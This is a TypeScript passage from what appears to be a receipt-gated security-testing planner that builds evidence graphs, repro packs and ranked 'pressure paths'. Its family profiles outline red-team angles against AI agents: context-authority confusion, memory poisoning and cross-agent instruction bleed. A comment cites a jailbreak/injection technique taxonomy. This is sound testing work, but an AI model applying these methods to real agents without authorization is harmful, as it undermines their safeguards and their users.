      relatedIds: highValueMissing,
    }));
  }

  if (pendingMemory.length) {
    actions.push(buildSelfHealAction({
      type: 'review_memory',
      severity: 'info',
      title: 'Learning proposal pending',
      detail: `${pendingMemory.length} memory proposal(s) need operator review.`,
      recommendedAction: 'Accept or reject learning proposals after evidence and retest review.',
      canApply: false,
      relatedIds: pendingMemory.map(proposal => proposal.id),
    }));
  }

  if (!actions.length) {
    actions.push(buildSelfHealAction({
      type: 'refresh_ledgers',
      severity: 'ok',
      title: 'Self-heal quiet',
      detail: 'No stale watch state, unresolved retest, open queue, receipt gate, or high-value local tool gap detected.',
      recommendedAction: 'Continue monitoring.',
      canApply: false,
      relatedIds: [],
    }));
  }

  const blocks = actions.filter(action => action.severity === 'block').length;
  const actionCount = actions.filter(action => action.severity === 'action').length;
  const watchCount = actions.filter(action => action.severity === 'watch').length;
  const health = blocks ? 'blocked' : actionCount ? 'repair' : watchCount ? 'watch' : 'ok';

  return redactSecrets({
    schema_version: 't3mp3st_self_heal/v1',
    generatedAt: nowIso(),
    scope: {
      missionId: scope.missionId || null,
      operationId: scope.operationId || null,
      family,
      target: scope.target,
    },
    health,
    summary: {
      actions: actions.length,
      blocks,
      repairs: actionCount,
      watches: watchCount,
      applied: actions.filter(action => action.applied).length,
      openWorkOrders: openWorkOrders.length,
      unresolvedRetests: unresolvedRetests.length,
      missingHighValueTools: highValueMissing.length,
      pendingMemory: pendingMemory.length,
    },
    actions,
    watchCycle: appliedWatchCycle,
    currentSignals,
    latestCycle,
    gate,
    arsenal: {
      family,
      readiness: (arsenalStatus.summary as Record<string, unknown> | undefined)?.readiness ?? null,
      missingCommandReady,
      highValueMissing,
    },
  }) as Record<string, unknown>;
}

function buildEvidenceGraph(params: Record<string, unknown>): Record<string, unknown> {
  const missionId = typeof params.missionId === 'string' ? params.missionId : '';
  const operationId = typeof params.operationId === 'string' ? params.operationId : '';
  const family = typeof params.family === 'string' ? normalizeMissionFamily(params.family, 'web_api') : undefined;
  const evidence = [...evidenceLedger.values()]
    .filter(entry => !missionId || entry.missionId === missionId)
    .filter(entry => !operationId || entry.operationId === operationId);
  const findings = [...findingsLedger.values()]
    .filter(finding => !missionId || finding.missionId === missionId)
    .filter(finding => !operationId || finding.operationId === operationId)
    .filter(finding => !family || finding.family === family);
  const findingIds = new Set(findings.map(finding => finding.id));
  const retests = [...retestLedger.values()].filter(retest =>
    findingIds.has(retest.findingId) ||
    ((!missionId || retest.missionId === missionId) && (!operationId || retest.operationId === operationId))
  );
  const hypotheses = scopedHypotheses(missionId, operationId, family);
  const hypothesisIds = new Set(hypotheses.map(hypothesis => hypothesis.id));
  const workOrders = scopedWorkOrders(missionId, operationId, family)
    .filter(order => !hypothesisIds.size || hypothesisIds.has(order.hypothesisId));
  const nodes: Array<Record<string, unknown>> = [];
  const edges: Array<Record<string, unknown>> = [];

  for (const hypothesis of hypotheses) {
    nodes.push({
      id: hypothesis.id,
      type: 'hypothesis',
      label: hypothesis.claim,
      status: hypothesis.status,
      confidence: hypothesis.confidence,
      family: hypothesis.family,
    });
    for (const evidenceId of hypothesis.evidenceForIds) edges.push({ from: hypothesis.id, to: evidenceId, type: 'evidence_for', weight: 1 });
    for (const evidenceId of hypothesis.evidenceAgainstIds) edges.push({ from: evidenceId, to: hypothesis.id, type: 'evidence_against', weight: -1 });
    for (const findingId of hypothesis.findingIds) edges.push({ from: hypothesis.id, to: findingId, type: 'promoted_to', weight: 1 });
  }

  for (const order of workOrders) {
    nodes.push({
      id: order.id,
      type: 'work_order',
      label: order.title,
      status: order.status,
      kind: order.kind,
      squad: order.squad,
      requiresReceipt: order.requiresReceipt,
    });
    edges.push({ from: order.hypothesisId, to: order.id, type: 'decomposes_to', weight: 1 });
    for (const evidenceId of order.evidenceIds) edges.push({ from: order.id, to: evidenceId, type: 'produced_evidence', weight: 1 });
  }

  for (const entry of evidence) {
    nodes.push({
      id: entry.id,
      type: 'evidence',
      label: entry.title,
      source: entry.source,
      evidenceType: entry.type,
      provenanceStrength: entry.provenanceStrength || inferEvidenceProvenanceStrength(entry),
    });
    if (entry.findingId) edges.push({ from: entry.id, to: entry.findingId, type: 'supports_finding', weight: 1 });
  }

  for (const finding of findings) {
    nodes.push({
      id: finding.id,
      type: 'finding',
      label: finding.title,
      status: finding.status,
      severity: finding.severity,
      confidence: finding.confidence,
    });
    for (const evidenceId of finding.evidenceIds) edges.push({ from: evidenceId, to: finding.id, type: 'finding_evidence', weight: 1 });
    for (const retestId of finding.retestIds) edges.push({ from: finding.id, to: retestId, type: 'retested_by', weight: 1 });
  }

  for (const retest of retests) {
    nodes.push({
      id: retest.id,
      type: 'retest',
      label: retest.method,
      status: retest.status,
    });
  }

  const uniqueNodes = [...new Map(nodes.map(node => [String(node.id), node])).values()];
  const unsupportedHypotheses = hypotheses.filter(hypothesis => !hypothesis.evidenceForIds.length && !hypothesis.evidenceAgainstIds.length);
  const unpromotedSupported = hypotheses.filter(hypothesis => hypothesis.status === 'supported' && !hypothesis.findingIds.length);
  const openWorkOrders = workOrders.filter(order => !['completed', 'blocked'].includes(order.status));
  const laneSummary = missionLaneSummary({ hypotheses, workOrders, findings, retests });
  const evidenceProvenance = summarizeEvidenceProvenance(evidence);
  return redactSecrets({
    schema_version: 't3mp3st_evidence_graph/v1',
    generatedAt: nowIso(),
    scope: { missionId: missionId || null, operationId: operationId || null, family: family || null },
    summary: {
      hypotheses: hypotheses.length,
      workOrders: workOrders.length,
      evidence: evidence.length,
      findings: findings.length,
      retests: retests.length,
      edges: edges.length,
      unsupportedHypotheses: unsupportedHypotheses.length,
      unpromotedSupported: unpromotedSupported.length,
      openWorkOrders: openWorkOrders.length,
      receiptRequiredWorkOrders: workOrders.filter(order => order.status === 'needs_receipt' || order.requiresReceipt).length,
      evidenceProvenance,
      laneSummary,
      activeLanes: laneSummary.filter(lane => lane.hypotheses || lane.workOrders || lane.findings || lane.retests).length,
    },
    nodes: uniqueNodes,
    edges,
    hypotheses,
    workOrders,
    nextActions: [
      unsupportedHypotheses.length ? 'Attach evidence for or against every open hypothesis.' : '',
      openWorkOrders.length ? 'Complete, block, or receipt-gate active work orders.' : '',
      unpromotedSupported.length ? 'Promote supported hypotheses into findings or explicitly reject them.' : '',
      findings.some(finding => !finding.retestIds.length) ? 'Queue retests for findings without validation runs.' : '',
      evidence.length && !hypotheses.length ? 'Create hypotheses so evidence has an explicit reasoning target.' : '',
    ].filter(Boolean),
  }) as Record<string, unknown>;
}

function buildReproPacks(params: Record<string, unknown>): Record<string, any> {
  const operationDraft = params.operationDraft && typeof params.operationDraft === 'object'
    ? params.operationDraft as Record<string, unknown>
    : {};
  const missionId = typeof params.missionId === 'string'
    ? params.missionId
    : typeof operationDraft.mission_id === 'string'
      ? operationDraft.mission_id
      : '';
  const operationId = typeof params.operationId === 'string'
    ? params.operationId
    : typeof operationDraft.operation_id === 'string'
      ? operationDraft.operation_id
      : '';
  const requestedFamily = typeof params.family === 'string' ? normalizeMissionFamily(params.family, 'web_api') : undefined;
  const target = normalizeTargetValue(params.target || operationDraft.target);
  const findingId = typeof params.findingId === 'string' ? params.findingId : '';
  const scopedFindings = [...findingsLedger.values()]
    .filter(finding => !missionId || finding.missionId === missionId)
    .filter(finding => !operationId || finding.operationId === operationId)
    .filter(finding => !requestedFamily || finding.family === requestedFamily)
    .filter(finding => !findingId || finding.id === findingId)
    .sort((a, b) => b.updatedAt.localeCompare(a.updatedAt));
  const scopedHypothesesList = scopedHypotheses(missionId, operationId, requestedFamily);
  const scopedOrders = scopedWorkOrders(missionId, operationId, requestedFamily);
  const packs = scopedFindings.map(finding => {
    const evidence = uniqueStrings([
      ...finding.evidenceIds,
      ...[...evidenceLedger.values()]
        .filter(entry => entry.findingId === finding.id)
        .map(entry => entry.id),
    ]).map(id => evidenceLedger.get(id)).filter(Boolean) as EvidenceEntry[];
    const evidenceProvenance = summarizeEvidenceProvenance(evidence);
    const proofLevel = strongestEvidenceStrength(evidence);
    const strongEvidence = evidence.filter(entry => evidenceStrengthRank(entry.provenanceStrength || inferEvidenceProvenanceStrength(entry)) >= evidenceStrengthRank('tool'));
    const strongest = strongEvidence[0] || evidence[0];
    const retests = finding.retestIds.map(id => retestLedger.get(id)).filter(Boolean) as RetestRecord[];
    const passedRetests = retests.filter(retest => retest.status === 'passed');
    const unresolvedRetests = retests.filter(retest => retest.status !== 'passed');
    const linkedHypotheses = scopedHypothesesList.filter(hypothesis => hypothesis.findingIds.includes(finding.id));
    const linkedHypothesisIds = new Set(linkedHypotheses.map(hypothesis => hypothesis.id));
    const linkedWorkOrders = scopedOrders.filter(order =>
      linkedHypothesisIds.has(order.hypothesisId) ||
      order.evidenceIds.some(id => finding.evidenceIds.includes(id))
    );
    const blockers = [
      evidenceStrengthRank(proofLevel) < evidenceStrengthRank('tool') ? 'needs_tool_or_replayable_evidence' : '',
      !retests.length ? 'needs_retest_queue' : '',
      unresolvedRetests.length ? `unresolved_retests:${unresolvedRetests.map(retest => retest.id).join(',')}` : '',
      finding.status === 'false_positive' ? 'finding_marked_false_positive' : '',
    ].filter(Boolean);
    const readiness: ReproPackReadiness = finding.status === 'false_positive'
      ? 'blocked'
      : evidenceStrengthRank(proofLevel) < evidenceStrengthRank('tool')
        ? 'needs_strong_evidence'
        : !passedRetests.length
          ? 'needs_retest'
          : 'ready';
    const evidenceReplaySteps = evidence.slice(0, 4).map((entry, index) => ({
      id: `evidence-${index + 1}`,
      actor: entry.source === 'tool' ? 'tool-runner' : entry.source,
      action: entry.command
        ? `Replay or inspect command artifact: ${redactString(entry.command)}`
        : entry.uri
          ? `Open or inspect artifact URI: ${redactString(entry.uri)}`
          : `Inspect evidence summary: ${entry.title}`,
      expectedSignal: entry.summary || entry.title,
      evidenceId: entry.id,
      provenanceStrength: entry.provenanceStrength || inferEvidenceProvenanceStrength(entry),
    }));
    return {
      id: `repro_${finding.id}`,
      findingId: finding.id,
      missionId: finding.missionId || missionId || null,
      operationId: finding.operationId || operationId || null,
      family: finding.family,
      target: finding.target || target,
      title: finding.title,
      claim: finding.claim,
      severity: finding.severity,
      confidence: finding.confidence,
      readiness,
      proofLevel,
      blockers,
      evidenceProvenance,
      evidenceIds: evidence.map(entry => entry.id),
      strongEvidenceIds: strongEvidence.map(entry => entry.id),
      hypothesisIds: linkedHypotheses.map(hypothesis => hypothesis.id),
      workOrderIds: linkedWorkOrders.map(order => order.id),
      retestIds: retests.map(retest => retest.id),
      safeProbe: strongest
        ? strongest.command
          ? `Rerun only inside approved scope, then compare output against evidence ${strongest.id}.`
          : `Reinspect ${strongest.type} evidence ${strongest.id} and compare it to the finding claim.`
        : 'Create a local-safe proof artifact before attempting replay.',
      expectedSignal: strongest?.summary || finding.claim,
      falsifiers: [
        'The strongest evidence cannot be reproduced or is outside mission scope.',
        'The observed signal does not support the stated impact.',
        'A disproof work order contradicts the claim.',
        'The retest fails, is blocked without residual-risk note, or lacks a fresh artifact.',
      ],
      replaySteps: [
        {
          id: 'scope',
          actor: 'operator',
          action: 'Confirm mission scope, target, and receipt before any active replay.',
          expectedSignal: finding.operationId || operationId ? 'operation id matches current mission contract' : 'mission contract is attached',
        },
        ...evidenceReplaySteps,
        {
          id: 'retest',
          actor: 'validator',
          action: passedRetests[0]
            ? `Review passed retest ${passedRetests[0].id}: ${passedRetests[0].method}`
            : retests[0]
              ? `Run or explicitly block retest ${retests[0].id}: ${retests[0].method}`
              : 'Queue a retest with acceptance criteria before declaring this replayable.',
          expectedSignal: passedRetests[0]?.resultSummary || finding.acceptanceCriteria.join('; ') || 'fresh pass/fail/block decision',
        },
        {
          id: 'decision',
          actor: 'skeptic',
          action: 'Mark reproduced, falsified, or blocked, then update finding status and learning proposal.',
          expectedSignal: 'evidence, finding, retest, and memory proposal remain linked',
        },
      ],
      operatorBrief: readiness === 'ready'
        ? 'Replayable enough for handoff: strong evidence and a passed retest are linked.'
        : readiness === 'needs_strong_evidence'
          ? 'Not ready: claim needs tool, receipt, screenshot, or replayable artifact evidence.'
          : readiness === 'needs_retest'
            ? 'Almost there: strong evidence exists, but validation still needs a passed retest.'
            : 'Blocked: preserve as a no-route or false-positive path until corrected.',
      generatedAt: nowIso(),
    };
  });
  const summary = {
    total: packs.length,
    ready: packs.filter(pack => pack.readiness === 'ready').length,
    needsStrongEvidence: packs.filter(pack => pack.readiness === 'needs_strong_evidence').length,
    needsRetest: packs.filter(pack => pack.readiness === 'needs_retest').length,
    blocked: packs.filter(pack => pack.readiness === 'blocked').length,
    byFamily: packs.reduce<Record<string, number>>((acc, pack) => {
      acc[pack.family] = (acc[pack.family] || 0) + 1;
      return acc;
    }, {}),
  };
  return redactSecrets({
    schema_version: 't3mp3st_repro_packs/v1',
    generatedAt: nowIso(),
    scope: {
      missionId: missionId || null,
      operationId: operationId || null,
      family: requestedFamily || null,
      findingId: findingId || null,
      target,
    },
    summary,
    packs,
    nextActions: [
      summary.needsStrongEvidence ? 'Upgrade weak/context claims with tool, receipt, screenshot, or replayable evidence.' : '',
      summary.needsRetest ? 'Run or complete retests for strong-evidence findings.' : '',
      summary.ready ? 'Hand ready repro packs to a skeptic, teammate, or report generator.' : '',
      !summary.total ? 'Promote evidence-backed hypotheses into findings before building repro packs.' : '',
    ].filter(Boolean),
  }) as Record<string, any>;
}

function severityPressureWeight(value: unknown): number {
  const severity = String(value || 'info') as FindingSeverity;
  const weights: Record<FindingSeverity, number> = {
    info: 8,
    low: 20,
    medium: 42,
    high: 68,
    critical: 82,
  };
  return weights[severity] ?? weights.info;
}

function proofPressureWeight(value: unknown): number {
  const proof = String(value || 'weak') as EvidenceProvenanceStrength;
  const weights: Record<EvidenceProvenanceStrength, number> = {
    weak: 0,
    context: 6,
    tool: 15,
    replayable: 24,
  };
  return weights[proof] ?? 0;
}

function pressureProfileForFamily(family: MissionFamily): {
  specialist: string;
  pressureQuestion: string;
  capability: string;
  entry: string;
  control: string;
  pivot: string;
  impact: string;
  defense: string;
  strangeRoute: string;
  toolHints: string[];
  techniques?: readonly string[];   // distilled L1B3RT4S/Parseltongue technique ids (ai_red_team only)
} {
  const profiles: Record<MissionFamily, ReturnType<typeof pressureProfileForFamily>> = {
    web_api: {
      specialist: 'web weird-machine hunter',
      pressureQuestion: 'Can valid routes, auth state, and stored data compose into an unintended capability?',
      capability: 'route, identity, or state-transition leverage',
      entry: 'Replay the local evidence path against a synthetic route or fixture.',
      control: 'Map which actor, token, session, or object boundary the finding appears to bend.',
      pivot: 'Look for a second valid workflow that turns the first bug into broader state confusion.',
      impact: 'Rehearse data exposure, account boundary drift, or privilege confusion with harmless canaries.',
      defense: 'Convert the path into an authorization test, invariant check, and regression fixture.',
      strangeRoute: 'A normal user workflow becomes a weird machine when stale UI state and API trust disagree.',
      toolHints: ['httpx', 'zap-baseline', 'burp', 'playwright', 'jq'],
    },
    ai_red_team: {
      specialist: 'model-boundary breaker',
      pressureQuestion: 'Can instructions, retrieved context, or scoring artifacts override the mission contract?',
      capability: 'context authority confusion or model/tool boundary drift',
      entry: 'Replay the prompt/context fixture locally and label which text is user goal versus untrusted data.',
      control: 'Probe whether the agent treats observation, evidence, or role text as executable authority.',
      pivot: 'Stack benign prompt frames to test whether tool selection or memory promotion changes unexpectedly.',
      impact: 'Rehearse unsafe delegation, false readiness, or memory poisoning in a simulator transcript.',
      defense: 'Add authority labels, context provenance checks, refusal-independent rubric tests, and memory gates.',
      strangeRoute: 'A harmless artifact becomes a command channel when the agent forgets where authority lives.',
      toolHints: ['promptfoo', 'garak', 'pytest', 'json-schema', 'fixture-runner'],
      techniques: AI_REDTEAM_TECHNIQUE_IDS,   // Pliny's distilled jailbreak/injection taxonomy (see /api/ai-redteam/playbook)
    },
    cloud_infra: {
      specialist: 'identity and exposure cartographer',
      pressureQuestion: 'Can safe configuration facts combine into unintended reachability or identity leverage?',
      capability: 'identity, network, or service-boundary leverage',
      entry: 'Replay inventory evidence against synthetic IAM/network fixtures or read-only local configs.',
      control: 'Map the exact principal, trust edge, or exposed surface involved.',
      pivot: 'Combine one identity edge with one reachability edge to test for a higher-impact route.',
      impact: 'Rehearse privilege or exposure impact with local policy simulators and non-secret canaries.',
      defense: 'Emit deny-by-default policy tests, exposure monitors, and least-privilege diffs.',
      strangeRoute: 'Two individually acceptable grants compose into an authority bridge no owner expected.',
      toolHints: ['prowler', 'cloudsplaining', 'terraform-compliance', 'checkov', 'opa'],
    },
    smart_contract: {
      specialist: 'economic invariant breaker',
      pressureQuestion: 'Can contract states, incentives, or oracle assumptions compose into a value-moving route?',
      capability: 'state-machine or economic-invariant pressure',
      entry: 'Replay the claim on a forkless local fixture or deterministic unit test.',
      control: 'Name the invariant, actor sequence, and asset accounting edge under pressure.',
      pivot: 'Search for a second state transition that turns a small invariant wobble into protocol risk.',
      impact: 'Rehearse the value movement using toy amounts and local chain simulation only.',
      defense: 'Add invariant tests, differential traces, event monitors, and pause/rollback runbooks.',
      strangeRoute: 'The bug is not one call; it is an unexpected economic loop through legal calls.',
      toolHints: ['slither', 'foundry', 'echidna', 'halmos', 'mythril'],
    },
    code_supply_chain: {
      specialist: 'package-trust adversary',
      pressureQuestion: 'Can scripts, dependencies, configs, and release defaults compose into hidden execution trust?',
      capability: 'build, dependency, or release-trust leverage',
      entry: 'Replay package metadata, scripts, and lockfile evidence in a local throwaway workspace.',
      control: 'Identify which install/build/release phase grants code execution or trust.',
      pivot: 'Combine dependency drift with script hooks, publish config, or CI assumptions.',
      impact: 'Rehearse tamper, secret exposure, or build substitution using canary files and dry-run publishes.',
      defense: 'Add lockfile policy, script allowlists, provenance attestations, and release canaries.',
      strangeRoute: 'The exploit path is a trusted chore: install, test, package, or publish.',
      toolHints: ['npm audit', 'osv-scanner', 'semgrep', 'trivy', 'slsa-verifier'],
    },
    crypto_secrets: {
      specialist: 'secret and entropy hunter',
      pressureQuestion: 'Can weak handling, accidental storage, or deterministic generation expose authority material?',
      capability: 'secret custody, entropy, or key-lifecycle leverage',
      entry: 'Replay only redacted fixtures, entropy tests, and local canary secrets.',
      control: 'Map where authority material is created, stored, transformed, logged, or reused.',
      pivot: 'Combine a leak surface with stale rotation, broad scope, or downstream trust.',
      impact: 'Rehearse blast radius with fake keys, shadow tokens, and revocation drills.',
      defense: 'Add secret scanners, entropy checks, rotation runbooks, and token-scope tests.',
      strangeRoute: 'A low-value log line becomes authority when combined with reuse and weak rotation.',
      toolHints: ['gitleaks', 'trufflehog', 'detect-secrets', 'jwt-cli', 'age'],
    },
    reverse_binary: {
      specialist: 'binary weird-machine mapper',
      pressureQuestion: 'Can parser, format, or state-machine assumptions create unintended computation?',
      capability: 'parser, memory, or binary state leverage',
      entry: 'Replay crashes or traces against local toy inputs and deterministic fixtures.',
      control: 'Label the parser state, trust boundary, and exact input region involved.',
      pivot: 'Mutate adjacent format fields to find state transitions that alter behavior without leaving scope.',
      impact: 'Rehearse crash, parse confusion, or sandbox escape hypotheses with nonweaponized canaries.',
      defense: 'Add fuzz seeds, sanitizer tests, parser invariants, and corpus minimization artifacts.',
      strangeRoute: 'The input format secretly contains a tiny machine the parser did not intend to run.',
      toolHints: ['radare2', 'ghidra', 'afl++', 'honggfuzz', 'binwalk'],
    },
    agent_warfare: {
      specialist: 'agent control-plane duelist',
      pressureQuestion: 'Can agents, tools, ledgers, or delegated work orders confuse authority and state?',
      capability: 'tool routing, memory, or delegated-agency leverage',
      entry: 'Replay the work-order, fake tool-output, or memory fixture in a local transcript harness.',
      control: 'Mark every authority edge: user, page, tool output, memory, teammate, and system policy.',
      pivot: 'Stack a stale ledger signal with a delegated task to see whether state drifts or gates vanish.',
      impact: 'Rehearse bad tool choice, premature readiness, poisoned memory, or cross-agent instruction bleed.',
      defense: 'Add authority tags, signed tool outputs, work-order receipts, and memory-promotion tests.',
      strangeRoute: 'The exploit is social within the machine: one component convinces another it has authority.',
      toolHints: ['promptfoo', 'playwright', 'json-schema', 'fixture-runner', 'policy-replay'],
    },
    social_osint: {
      specialist: 'exposure and influence mapper',
      pressureQuestion: 'Can public signals, identity assumptions, or workflow habits produce exploitable exposure?',
      capability: 'human/process exposure leverage',
      entry: 'Replay only synthetic personas, public fixtures, or owner-provided records.',
      control: 'Separate public facts, inferred relationships, and operator assumptions.',
      pivot: 'Combine one public signal with one process assumption to test for defensive exposure.',
      impact: 'Rehearse phishing-resistant controls, verification gaps, and comms runbooks with fake artifacts.',
      defense: 'Add verification scripts, exposure watchlists, takedown paths, and operator training notes.',
      strangeRoute: 'The failure is not secret data; it is a believable shortcut through human process.',
      toolHints: ['spiderfoot', 'theharvester', 'sherlock', 'manual-review', 'evidence-ledger'],
    },
    reporting_remediation: {
      specialist: 'impact-to-fix translator',
      pressureQuestion: 'Can evidence, severity, or remediation claims outrun what was actually proven?',
      capability: 'trust, reporting, or remediation leverage',
      entry: 'Replay the claim/evidence linkage and compare it with retest status.',
      control: 'Identify where wording, severity, or fix readiness exceeds evidence.',
      pivot: 'Chain one ambiguous claim with one missing retest to find report-level trust failure.',
      impact: 'Rehearse stakeholder confusion, false assurance, or patch drift with a dry-run report.',
      defense: 'Add report gates, evidence graph checks, retest queues, and residual-risk notes.',
      strangeRoute: 'The dangerous action is not exploitation; it is convincing everyone the mission is done.',
      toolHints: ['evidence-graph', 'markdownlint', 'json-schema', 'retest-ledger', 'diff-review'],
    },
  };
  return profiles[family] || profiles.web_api;
}

function approvalTargetMatchesPressurePath(approval: ApprovalRequest, target: string): boolean {
  if (approval.target === '*') return true;
  return hostFromTarget(approval.target) === hostFromTarget(target);
}

function buildPressurePaths(params: Record<string, unknown>): Record<string, any> {
  const operationDraft = params.operationDraft && typeof params.operationDraft === 'object'
    ? params.operationDraft as Record<string, unknown>
    : {};
  const missionId = typeof params.missionId === 'string'
    ? params.missionId
    : typeof operationDraft.mission_id === 'string'
      ? operationDraft.mission_id
      : '';
  const operationId = typeof params.operationId === 'string'
    ? params.operationId
    : typeof operationDraft.operation_id === 'string'
      ? operationDraft.operation_id
      : '';
  const requestedFamily = typeof params.family === 'string' ? normalizeMissionFamily(params.family, 'web_api') : undefined;
  const target = normalizeTargetValue(params.target || operationDraft.target);
  const reproPacks = params.reproPacks && typeof params.reproPacks === 'object'
    ? params.reproPacks as Record<string, any>
    : buildReproPacks({ missionId, operationId, family: requestedFamily, operationDraft, target });
  const packs = Array.isArray(reproPacks.packs) ? reproPacks.packs as Array<Record<string, any>> : [];
  const approvals = [...approvalRequests.values()]
    .filter(approval => approvalIsFresh(approval))
    .filter(approval => !operationId || approval.operationId === operationId || approvalTargetMatchesPressurePath(approval, target));

  const paths = packs.map((pack, index) => {
    const family = normalizeMissionFamily(pack.family, requestedFamily || 'web_api');
    const profile = pressureProfileForFamily(family);
    const pathTarget = normalizeTargetValue(pack.target || target);
    const isLocalSimulatorTarget = isLoopbackOrLabTarget(pathTarget);
    const hasActiveReceipt = approvals.some(approval =>
      ['mission_execution', 'command_execution', 'network_request', 'autonomous_execution'].includes(approval.action) &&
      approvalTargetMatchesPressurePath(approval, pathTarget)
    );
    const blockers = normalizeStringList(pack.blockers);
    const readinessValue = String(pack.readiness || 'needs_repro') as ReproPackReadiness;
    const blocked = readinessValue === 'blocked' || blockers.includes('finding_marked_false_positive');
    const needsReceipt = !isLocalSimulatorTarget && !hasActiveReceipt;
    const readiness: PressurePathReadiness = blocked
      ? 'blocked'
      : readinessValue !== 'ready'
        ? 'needs_repro'
        : needsReceipt
          ? 'needs_receipt'
          : 'armed';
    const posture: PressurePathPosture = blocked
      ? 'blocked'
      : isLocalSimulatorTarget
        ? 'simulator'
        : 'receipt_gated';
    const confidence = clampConfidence(pack.confidence);
    const offensiveScore = Math.max(0, Math.min(100, Math.round(
      severityPressureWeight(pack.severity) +
      Math.round(confidence * 12) +
      proofPressureWeight(pack.proofLevel) +
      (readinessValue === 'ready' ? 18 : readinessValue === 'needs_retest' ? 6 : 0) +
      (Array.isArray(pack.retestIds) && pack.retestIds.length ? 6 : 0) -
      (blockers.length * 7) -
      (needsReceipt ? 10 : 0) -
      (blocked ? 25 : 0)
    )));
    const title = `${profile.specialist}: ${pack.title || pack.findingId || `path ${index + 1}`}`;
    const requiredReceipts = [
      isLocalSimulatorTarget ? '' : 'mission_execution receipt for any non-local or live-target action',
      isLocalSimulatorTarget ? '' : 'command_execution or network_request receipt before leaving route preview',
      'fresh scope receipt before active replay, even when a simulator path is armed',
    ].filter(Boolean);
    const noGo = [
      !isLocalSimulatorTarget && !hasActiveReceipt ? 'non_local_target_without_active_receipt' : '',
      readinessValue !== 'ready' ? `repro_pack_not_ready:${readinessValue}` : '',
      evidenceStrengthRank(pack.proofLevel) < evidenceStrengthRank('tool') ? 'proof_weaker_than_tool_or_replayable' : '',
      blockers.length ? `repro_blockers:${blockers.join(',')}` : '',
      'no live exploitation, credential use, persistence, lateral movement, or state-changing action from this planner',
      'hold if impact wording outruns the linked evidence or retest artifact',
    ].filter(Boolean);
    const chainStages = [
      {
        id: 'receipt',
        label: 'Authority lock',
        objective: isLocalSimulatorTarget
          ? 'Keep the path inside local canaries and attached mission scope.'
          : 'Stop at preview until a fresh receipt explicitly authorizes the target and action.',
        expectedSignal: isLocalSimulatorTarget ? 'local simulator only' : hasActiveReceipt ? 'receipt attached' : 'receipt required',
      },
      {
        id: 'entry',
        label: 'Entry signal',
        objective: profile.entry,
        expectedSignal: pack.expectedSignal || pack.claim || 'evidence-backed signal remains reproducible',
      },
      {
        id: 'control',
        label: 'Control edge',
        objective: profile.control,
        expectedSignal: profile.capability,
      },
      {
        id: 'pivot',
        label: 'Composed pressure',
        objective: profile.pivot,
        expectedSignal: 'second local condition either amplifies or falsifies the route',
      },
      {
        id: 'impact',
        label: 'Impact rehearsal',
        objective: profile.impact,
        expectedSignal: 'canary impact artifact, not live target impact',
      },
      {
        id: 'defense',
        label: 'Convert to defense',
        objective: profile.defense,
        expectedSignal: 'patch, detector, runbook, or regression test queued',
      },
    ];
    return {
      id: `pressure_${pack.findingId || index + 1}`,
      findingId: pack.findingId || null,
      reproPackId: pack.id || null,
      missionId: pack.missionId || missionId || null,
      operationId: pack.operationId || operationId || null,
      family,
      target: pathTarget,
      title,
      claim: pack.claim || '',
      severity: pack.severity || 'info',
      confidence,
      offensiveScore,
      readiness,
      posture,
      specialist: profile.specialist,
      pressureQuestion: profile.pressureQuestion,
      capabilityHypothesis: profile.capability,
      strangeRoute: profile.strangeRoute,
      chainStages,
      safeSimulator: {
        mode: 'local_canary',
        target: isLocalSimulatorTarget ? pathTarget : 'local-lab mirror required before action',
        setup: 'Create a synthetic fixture or mirror that represents the boundary without touching external systems.',
        probe: pack.safeProbe || 'Replay only the local evidence path and compare against the expected signal.',
        expectedSignal: pack.expectedSignal || pack.claim || 'the canary either proves or kills the route',
        artifact: `pressure-path-${pack.findingId || index + 1}-canary.json`,
      },
      requiredReceipts,
      noGo,
      toolHints: profile.toolHints,
      evidenceIds: normalizeStringList(pack.evidenceIds),
      strongEvidenceIds: normalizeStringList(pack.strongEvidenceIds),
      hypothesisIds: normalizeStringList(pack.hypothesisIds),
      retestIds: normalizeStringList(pack.retestIds),
      nextWorkOrders: [
        {
          lane: profile.specialist,
          title: 'Build the canary pressure route',
          objective: `Turn ${pack.findingId || 'the finding'} into a local simulator that rehearses ${profile.capability}.`,
          requiresReceipt: false,
        },
        {
          lane: 'skeptic',
          title: 'Kill the route before trusting it',
          objective: 'Find the fastest falsifier: stale evidence, missing retest, scope mismatch, or no impact.',
          requiresReceipt: false,
        },
        {
          lane: 'operator',
          title: 'Request active receipt only if simulator evidence survives',
          objective: 'Escalate from preview to approved action only with a fresh mission/action receipt.',
          requiresReceipt: true,
        },
      ],
      operatorBrief: readiness === 'armed'
        ? `Armed for local pressure rehearsal: ${offensiveScore}/100, simulator-first, evidence-linked.`
        : readiness === 'needs_receipt'
          ? `Sharp but gated: ${offensiveScore}/100, needs explicit receipt before touching ${pathTarget}.`
          : readiness === 'needs_repro'
            ? `Not sharp enough yet: upgrade the repro pack before treating this as an offensive path.`
            : 'Blocked: preserve as a no-route until evidence, status, or scope changes.',
      generatedAt: nowIso(),
    };
  }).sort((a, b) => b.offensiveScore - a.offensiveScore || String(a.readiness).localeCompare(String(b.readiness)));

  const summary = {
    total: paths.length,
    armed: paths.filter(path => path.readiness === 'armed').length,
    needsRepro: paths.filter(path => path.readiness === 'needs_repro').length,
    needsReceipt: paths.filter(path => path.readiness === 'needs_receipt').length,
    blocked: paths.filter(path => path.readiness === 'blocked').length,
    maxOffensiveScore: paths.reduce((max, path) => Math.max(max, path.offensiveScore || 0), 0),
    byFamily: paths.reduce<Record<string, number>>((acc, path) => {
      acc[path.family] = (acc[path.family] || 0) + 1;
      return acc;
    }, {}),
    byPosture: paths.reduce<Record<string, number>>((acc, path) => {
      acc[path.posture] = (acc[path.posture] || 0) + 1;
      return acc;
    }, {}),
  };
  return redactSecrets({
    schema_version: 't3mp3st_pressure_paths/v1',
    generatedAt: nowIso(),
    scope: {
      missionId: missionId || null,
      operationId: operationId || null,
      family: requestedFamily || null,
      target,
    },
    doctrine: {
      stance: 'offense becomes defense when the sharpest route is evidence-backed, locally rehearsed, and receipt-gated',
      noLiveAction: true,
    },
    summary,
    paths,
    nextActions: [
      summary.armed ? 'Run the top armed path through a local canary simulator, attach the artifact, then retest.' : '',
      summary.needsReceipt ? 'Request explicit mission/action receipts before any non-local or state-changing probe.' : '',
      summary.needsRepro ? 'Upgrade weak paths by completing repro packs and retests before chaining.' : '',
      summary.blocked ? 'Keep blocked paths as no-route evidence until a fresh finding changes the record.' : '',
      !summary.total ? 'Promote at least one evidence-backed finding, then build repro packs before pressure planning.' : '',
    ].filter(Boolean),
  }) as Record<string, any>;
}

